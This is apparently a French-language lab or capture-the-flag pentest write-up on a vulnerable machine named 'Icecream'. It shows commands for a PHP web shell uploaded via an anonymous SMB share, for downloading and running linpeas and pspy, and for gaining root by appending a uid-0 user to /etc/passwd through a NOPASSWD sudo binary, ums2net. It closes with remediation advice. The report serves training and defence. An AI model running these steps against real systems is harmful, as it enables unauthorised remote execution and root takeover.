# 📌 Rapport de Vulnérabilité : Icecream

## 1. Introduction

### Objectif  
Identifier et exploiter les failles de sécurité de la machine cible **"Icecream"**.

### Informations sur les IP  
- **IP Cible :** 192.168.188.214  
- **IP Kali :** 192.168.188.128  

Après avoir installé **Icecream** et testé la communication entre les machines, nous pouvons commencer le pentest.

## 2. Découverte et Analyse Initiale des Services

### 2.1. Scan Nmap

#### Commandes exécutées :  
Définition de la variable IP cible et exécution d’un scan complet des ports, suivi d’un scan approfondi (`-sVC`) pour détecter les services et versions.

target=192.168.188.214  
nmap -T4 -p$(nmap -Pn -T4 -n -p- $target | grep 'tcp.*open' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -Pn -n -sVC $target  

### 2.2. Analyse des services ouverts  

| Port  | Service      | Version / Info                 |
|-------|------------|--------------------------------|
| 22    | SSH        | OpenSSH 9.2p1 (Debian 12)      |
| 90    | HTTP       | Nginx 1.22.1 (403 Forbidden)   |
| 139   | SMB        | Samba 4.6.2 (NetBIOS)          |
| 445   | SMB        | Samba 4.6.2                    |
| 9000  | HTTP       | Nginx Unity 1.33.0 (Unit Server) |

## 3. Potentielles Pistes d'Exploitation

### 3.1. Exploitation des Ports SMB  
Analyse des vulnérabilités potentielles des ports **139** & **445** (Samba 4.6.2).  
Après consultation de **SearchSploit** et **CVE Details**, aucune faille exploitable récente n'a été identifiée.

#### Tests de connexion SMB  
Utilisation de `smbclient` pour tester l'accès aux partages.

smbclient -L //192.168.188.214 -N  

Connexion au partage **"icecream"** :  

smbclient //192.168.188.214/icecream -N  

📌 **Constat :**  
✅ Accès en écriture confirmé.  

## 4. Exploitation et Accès à la Machine

### 4.1. Mise en place d'un Web Shell  
Création et envoi d’un **Web Shell** pour exécuter des commandes à distance.

echo "<?php system(\$_GET['cmd']); ?>" > shell.php  

Envoi du Web Shell via **SMB** :  

smbclient //192.168.188.214/icecream -N  
put shell.php  

Exécution de commandes :  

curl "http://192.168.188.214/shell.php?cmd=id"  

## 5. Élévation de Privilèges

### 5.1. Analyse avec Linpeas et PSPY  
Téléchargement et exécution de **Linpeas** et **PSPY** pour identifier des vulnérabilités d’élévation de privilèges.

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh  

wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64  
chmod +x pspy64  
./pspy64  

### 5.2. Exploitation de CVE-2021-3156  
Tentative d’exploitation de **CVE-2021-3156 (sudo heap overflow)** pour obtenir un shell root.  
❌ **Échec :** La version du système ne permet pas l’exploitation de cette faille.

### 5.3. Exploitation via ums2net  
L'exécutable `/usr/sbin/ums2net` est utilisable **sans mot de passe (NOPASSWD)**, ce qui permet de **modifier `/etc/passwd`** et d’ajouter un utilisateur root.

#### Modification de `/etc/passwd`  
echo 'aurelien:$6$IPVFVjVKK55o19kF$XqJHT3H5Qcmk96/iaLUfcC3UQPEYF0yFGzRtTinb/9NfQZIpWed9UfA6YBaEWhE5TRc1MLaXgLHWUtYI010Pj1:0:0:aurelien:/home/aurelien:/bin/bash' >> passwd  
nc -v 192.168.188.214 5000 < ./passwd  
sudo /usr/sbin/ums2net -c /tmp/config -d  

✅ **Accès root obtenu** via l’utilisateur **"aurelien"**.

## 6. Recommandations de Sécurité pour Corriger la Vulnérabilité ums2net

### 6.1. Révision des Permissions de Sudo  
Modifier le fichier `/etc/sudoers` pour supprimer **NOPASSWD** des commandes sensibles.

### 6.2. Sécurisation des Fichiers de Configuration  
- Restreindre les permissions de `/etc/passwd` :  
  chmod 644 /etc/passwd  
- Empêcher **ums2net** d’être exécuté en tant que root.

### 6.3. Mise à Jour et Patch du Système  
- Désinstaller ou mettre à jour **ums2net**.
- Vérifier les services SMB et SSH pour éviter les accès non autorisés.

## 7. Conclusion  
Nous avons réussi à :  
1. **Accéder au partage SMB** et identifier des fichiers exploitables.  
2. **Déployer un Web Shell** pour obtenir un accès shell distant.  
3. **Élever nos privilèges à root** en exploitant **ums2net**.

📌 **Actions correctives impératives** :  
- **Désactiver ou patcher ums2net**.  
- **Appliquer des restrictions sur SMB et SSH**.  
- **Surveiller les logs système pour détecter toute activité suspecte**.
